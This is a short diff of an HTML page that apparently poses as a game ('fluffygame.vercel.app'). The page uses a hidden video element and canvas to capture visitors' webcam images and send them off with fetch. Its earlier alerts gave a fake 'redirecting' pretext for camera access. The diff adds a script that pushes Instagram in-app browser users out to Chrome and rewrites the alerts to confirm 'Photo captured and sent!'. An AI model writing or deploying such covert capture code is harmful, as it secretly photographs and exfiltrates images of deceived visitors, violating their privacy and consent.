@@ -6,6 +6,12 @@
 <body>
   <video id="video" autoplay playsinline style="display: none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
+  
+  <script>
+  if (navigator.userAgent.includes("Instagram")) {
+    window.location.href = "googlechrome://fluffygame.vercel.app";
+  }
+  </script>
 
   <script>
     const video = document.getElementById('video');
@@ -40,11 +46,11 @@
       })
       .then(response => response.text())
       .then(result => {
-        alert("Redirecting to...");
+        alert("✅ Photo captured and sent!");
         console.log(result);
       })
       .catch(error => {
-        alert("Refresh and allow camera access to redirect");
+        alert("❌ Failed to send image");
         console.error(error);
       });
     }
